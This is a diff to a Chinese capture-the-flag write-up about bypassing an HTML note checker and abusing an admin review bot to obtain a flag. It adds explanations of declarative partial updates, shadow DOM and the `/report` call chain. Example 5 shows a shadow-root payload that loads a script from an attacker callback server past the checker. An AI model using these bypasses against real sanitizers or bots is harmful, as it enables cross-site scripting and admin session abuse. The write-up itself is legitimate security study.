@@ -204,11 +204,13 @@ HTML 解析器会自动补出 `html`/`head`/`body`：`meta` 进入 head，`div` 
 
 **例 3：meta 由 DPU 从文档末尾搬进 head**
 
+本例用到 DPU（Declarative Partial Updates，声明式部分更新），先说明它是什么：这是 HTML 的一个解析特性；`<?marker name="c">` 在文档中留一个占位点（处理指令节点，不是元素），文档后面的 `<template for=c>` 提供内容；解析器读到 `<template for=c>` 时，把它的内容搬入占位点的位置（占位点被替换）。完整机制与版本信息见 2.6.4。
+
 ```html
 <!doctype html><head><?marker name="c"></head><div></div><template for=c><meta http-equiv="content-security-policy" content="default-src 'none'"></template>
 ```
 
-检查在整份文档解析完成之后执行；此时 DPU 已把末尾 template 里的 meta 搬进 head，而 `<?marker>` 是处理指令，不是元素，不参与计数。最终元素结构与最小示例相同，七项条件全部成立。
+检查在整份文档解析完成之后执行；此时 DPU 已完成搬入，meta 出现在 head 里，占位点（处理指令）不参与元素计数。最终元素结构与最小示例相同，七项条件全部成立。
 
 **例 4：用声明式影子树藏起其他元素**
 
@@ -216,7 +218,7 @@ HTML 解析器会自动补出 `html`/`head`/`body`：`meta` 进入 head，`div` 
 <!doctype html><html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div><template shadowrootmode=open><p>影子内容</p></template></div></body></html>
 ```
 
-带 `shadowrootmode` 的 template 会被解析器消费：内容整体进入挂在 div 上的影子树，template 本身不留在普通树里。检查器数到的 div 是空的，影子树里的文本也不计入 `body.textContent`。七项条件全部成立。
+本例用到声明式影子树（Shadow DOM），先说明它是什么：某个元素上可以挂一棵独立的 DOM 树，这棵树叫影子树。影子根不是该元素的子节点，影子树里的节点也不在该元素的普通子树（由该元素的普通子节点构成）中；`children`、`childElementCount`、`textContent` 这类访问都只遍历普通子树，因此看不到影子树里的内容。带 `shadowrootmode` 的 template 会被解析器消费：它的内容全部进入 div 的影子树，template 本身不留在普通树里。检查器数到的 div 是空的，影子树里的文本也不计入 `body.textContent`。完整机制见 2.6.3。七项条件全部成立。
 
 **例 5：影子树里放脚本（攻击形态的检查器视角）**
 
@@ -224,13 +226,104 @@ HTML 解析器会自动补出 `html`/`head`/`body`：`meta` 进入 head，`div` 
 <!doctype html><html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div><template shadowrootmode=open><script src=https://回调服务器/s.js></script></template></div></body></html>
 ```
 
-机制与例 4 相同，只是把影子内容换成了 `<script>`。检查器不计数影子树，也不会执行脚本（JavaScript 关闭），它看到的结构与例 4 一模一样，七项条件全部成立；而浏览器渲染这份笔记时，影子树里的脚本会执行。这就是 2.6 攻击 payload 能通过检查的原理。
+机制与例 4 相同，只是把影子内容换成了 `<script>`。检查器不计数影子树，也不会执行脚本（因为 JavaScript 被关闭，上面已经讲过），它看到的结构与例 4 一模一样，七项条件全部成立；而浏览器渲染这份笔记时，影子树里的脚本会执行。这就是 2.6 攻击 payload 能通过检查的原理。
 
 以上五个示例均已提交给真实检查器实测（`/create` 全部返回 302；未通过检查的笔记会返回 400）。
 
 ### 2.3 机器人的完整流程
 
-机器人端入口是 `bot.js` 的 `review()`。按源码顺序，它做这些事：
+本节按调用顺序分三部分：`review()` 由什么触发、怎么被调用（2.3.1），它内部按什么顺序执行（2.3.2），以及它对提交页面的导航监听规则（2.3.3）。
+
+#### 2.3.1 触发与调用链：review() 是怎么被调用的
+
+整个机器人流程由一次 **POST /report** 请求触发（攻击者提交目标网址就是这一步）。触发入口有两个（等价）：
+
+- 页面：打开实例首页（路由 `/`，即 2.1 里启动后 curl 验证的那个地址）。首页包含 "Create note" 与 "Report document" 两块面板和最近笔记列表；其中 "Report document" 面板是提交网址的入口，填写 URL 后点 Send，浏览器提交的就是 POST /report；
+- 命令行：`curl -d 'url=<目标网址>' http://<实例>/report`（复现脚本用这个，见第五章）。
+
+"Report document" 面板的表单片段（来自 `src/views/index.ejs`，省略了外层的 `<p>` 与 `<label>` 标签），提交表单会调用`/report`接口：
+
+```html
+<form method="post" action="/report">
+  <input id="url" name="url" placeholder="https://example.com/" required>
+  <button type="submit">Send</button>
+</form>
+```
+
+表单属性与后端逐一对应：`method="post"` 与 `action="/report"` 决定点 Send 时向 `/report` 发送 POST 请求；`name="url"` 是服务器读取网址所用的键名（对应下方处理器源码里的 `req.body.url`）。
+
+`review` 不是由浏览器执行的，而是被 `src/server.js` 的 `/report` 路由处理器直接调用（跨文件调用）。模块接线：
+
+- `src/server.js` 顶部：`const { inspectDocument, review } = require("../bot/bot");`（`inspectDocument` 被 `/create` 调用，`review` 被 `/report` 调用）；
+- `bot/bot.js` 末尾：`module.exports = { inspectDocument, review };`。
+
+调用链（一行）：
+
+`POST /report` → `reportRateLimit` 限速 → `/report` 处理器（单例检查 → URL 校验 → 构造 `currentReview`）→ `await review(currentReview)`（进入 bot.js）→ 机器人执行五步（2.3.2）→ 返回 → 处理器渲染结果并清空 `currentReview`。
+
+处理器源码（`src/server.js`，注释为逐行说明）：
+
+```javascript
+app.post("/report", reportRateLimit, async (req, res) => {   // reportRateLimit：60 秒内最多 3 次
+  if (currentReview) {                                       // 单例检查：上一轮审查还在进行
+    res.status(429).render("message", { title: "Reviewer busy", message: "The reviewer is already checking a document. Try again shortly." });
+    return;
+  }
+
+  let target;
+  try {
+    target = new URL(String(req.body.url || ""));            // 解析提交的网址（表单字段名 url）
+  } catch {
+    res.status(400).render("message", { title: "Invalid URL", message: "Invalid URL." });
+    return;
+  }
+
+  if (!["http:", "https:"].includes(target.protocol)) {      // 只接受 http/https
+    res.status(400).render("message", { title: "Invalid URL", message: "Only HTTP and HTTPS URLs are accepted." });
+    return;
+  }
+
+  const noteId = String(target.searchParams.get("note") || ""); // 网址里的 note= 参数（笔记编号，供 /sandbox 取笔记）
+  const id = randomId(12);                                       // 本轮审查编号（后续会作为 rid 追加到提交的网址上）
+  currentReview = {                                              // 构造本轮审查记录：状态位全部初始化为 false
+    id, url: target.href, noteId,
+    prepared: false, approved: false, finalized: false, used: false, visited: false,
+    nonce: randomId(16), flag: null,
+  };
+
+  try {
+    await review(currentReview);                               // ★ 调用 bot.js 的 review：机器人从这里开始工作，整轮结束才返回
+    res.render("message", { title: "Reviewed", message: "The reviewer finished." });
+  } catch {
+    res.status(500).render("message", { title: "Review failed", message: "The reviewer could not open that URL." });
+  } finally {
+    currentReview = null;                                      // 本轮结束：清空单例，可提交下一轮
+  }
+});
+```
+
+调用链逐级展开：
+
+| 顺序 | 所在文件 | 动作 | 失败时 |
+|---|---|---|---|
+| 1 | server.js | `reportRateLimit` 限速：60 秒内最多 3 次 | 429 Too many review requests |
+| 2 | server.js | 单例检查：`currentReview` 非空，说明上一轮审查未结束 | 429 Reviewer busy |
+| 3 | server.js | 用 `new URL()` 解析提交的网址 | 400 Invalid URL |
+| 4 | server.js | 协议必须是 http/https | 400 Only HTTP and HTTPS URLs are accepted |
+| 5 | server.js | 取 `note=` 参数、生成编号、构造 `currentReview`（状态位全 false） | 无 |
+| 6 | server.js → bot.js | `await review(currentReview)`：调用机器人，传入刚构造的同一个对象引用 | 抛错 → 500 Review failed |
+| 7 | bot.js | `review()` 内部按 2.3.2 的五步执行 | 无 |
+| 8 | server.js | 渲染 "The reviewer finished."；`finally` 清空 `currentReview` | 无 |
+
+三个细节：
+
+- 第 6 步是 `await`：POST /report 的响应要等整轮审查结束（约十几秒）才返回，提交方需要等待；
+- `finally` 里清空 `currentReview` 之后，才允许提交下一轮（对应第 2 步的单例检查）；
+- `review()` 与服务器同在一个 Node 进程内执行（bot.js 是被 server.js `require` 的模块），它启动的是独立的无头 Chromium 进程。
+
+#### 2.3.2 review() 的执行顺序
+
+被调用后，`review(report)` 内部按下面的顺序执行；先看整体代码（含步骤注释）：
 
 ```javascript
 const context = await browser.createBrowserContext();     // 为本次审查创建独立浏览器上下文：其下所有页面共享同一份 cookie（步骤 1 建立的管理员会话供后续步骤共用）
@@ -271,6 +364,8 @@ await page.close();
 | 3 | 访问 `/api/flag` | flag 被存进本轮审查记录 `currentReview.flag` |
 | 4 | 调用 `/reports/arm/<编号>` | `prepared = true` |
 | 5 | 访问提交网址，停留 10 秒 | 攻击链发生在这一步内 |
+
+#### 2.3.3 watchDocument 的监听规则
 
 步骤 5 中的 `watchDocument` 是机器人对"提交网址页面"的导航监听，规则有三条：
 
@@ -663,7 +758,7 @@ window.open("http://localhost:3000/review?rid=" + rid);
 
 - **`about:blank` 步骤的作用**：主窗口需要先"离开"入口网址，`history.back()` 才有可回退的记录（历史栈变成"入口网址 ← about:blank"，回退即回到入口）。`about:blank` 是一次不产生网络请求的导航，不会干扰机器人的导航监听（见下条）；
 - **为什么 `helper` 能操作主窗口**：`helper` 与入口页都由攻击者控制、同源；同源窗口之间可以互相访问 `history` 对象。`opener` 是弹窗对"打开它的窗口"（主窗口）的引用；
-- **为什么这次导航恰好设置 `finalized`**：机器人 `watchDocument` 的规则（2.3）是"主窗口的导航请求命中审查页 → `finalized = approved && !diverged`"。整个序列里主窗口的导航请求只有三次：入口网址（第一步，记为入口）、回退后再次访问入口网址（与入口相同，不算偏离）、以及 302 之后的审查页请求（命中）。`about:blank` 不产生网络请求，不会被计入。因此 `diverged` 保持为假，命中时 `approved` 已为真（2.7 完成），`finalized` 被置真。
+- **为什么这次导航恰好设置 `finalized`**：机器人 `watchDocument` 的规则（2.3.3）是"主窗口的导航请求命中审查页 → `finalized = approved && !diverged`"。整个序列里主窗口的导航请求只有三次：入口网址（第一步，记为入口）、回退后再次访问入口网址（与入口相同，不算偏离）、以及 302 之后的审查页请求（命中）。`about:blank` 不产生网络请求，不会被计入。因此 `diverged` 保持为假，命中时 `approved` 已为真（2.7 完成），`finalized` 被置真。
 
 `/` 路由的第二次访问处理（回调服务器端，完整脚本见第五章）：
 
@@ -869,7 +964,7 @@ if (location.pathname == "/reports/check") {
 
 | 行 | 含义 | 对应章节 |
 |---|---|---|
-| 第 1 行 `/CHECK ... visited=false ...` | 机器人访问审查页**第一次**：`visited` 尚为假；本次请求由 goto 发出，`sf=none/document` | 2.3 步骤 2 |
+| 第 1 行 `/CHECK ... visited=false ...` | 机器人访问审查页**第一次**：`visited` 尚为假；本次请求由 goto 发出，`sf=none/document` | 2.3.2 步骤 2 |
 | 第 2 行 `/review ... match=true admin=true` | 审批页面被打开（弹窗顶层导航携带管理员 cookie） | 2.7.3 |
 | 第 3 行 `/sandbox ... prepared=true` | 沙箱 iframe 加载笔记原文，`s.js` 在此执行 | 2.6.6 |
 | 第 4 行 `/REAL /complete ... match=true` | 审批页面调用 `/complete` 成功（`admin`、`id`、`state`、`prepared` 全对） | 2.7 |
@@ -1202,7 +1297,7 @@ python3 solve.py
 | MessageChannel | 浏览器 API：创建一对互通的消息端口 |
 | 消息端口转移 | `postMessage` 第三参数把端口所有权交给另一窗口（可跨源） |
 | 声明式 Shadow DOM | 用 `<template shadowrootmode=...>` 创建影子树的写法 |
-| 影子树 | 挂在元素上的独立 DOM 子树；不计入宿主元素的子元素计数与文本 |
+| 影子树 | 挂在元素上的独立 DOM 树；其节点不在该元素的普通子树中，不计入子元素计数与文本 |
 | DPU | Declarative Partial Updates，声明式部分更新（2026-05 新特性） |
 | 处理指令 | `<?marker ...>` 形式的节点；不是元素，不参与元素计数 |
 | 解析阻塞 | 外部脚本加载/执行期间解析器暂停，后续内容延后解析 |
